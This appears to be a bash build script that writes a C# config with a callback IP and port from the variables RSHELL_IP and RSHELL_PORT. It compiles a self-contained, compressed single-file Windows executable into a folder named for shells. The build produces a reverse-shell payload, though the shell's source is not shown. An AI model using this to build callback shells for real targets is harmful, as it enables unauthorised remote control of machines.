#!/bin/bash
set -e

echo 'test'
echo $(pwd)

shells_and_executions="/shells_and_executions"

cat > ./Config.cs <<EOL
public static class Config
{
    public const string IP = "$RSHELL_IP";
    public const int PORT = $RSHELL_PORT;
}
EOL

dotnet publish -c Release -r win-x64 --self-contained true \
    -p:PublishSingleFile=true \
    -p:IncludeNativeLibrariesForSelfExtract=true \
    -p:EnableCompressionInSingleFile=true \
    -p:AssemblyName=$RSHELL_FILENAME \
    -o $shells_and_executions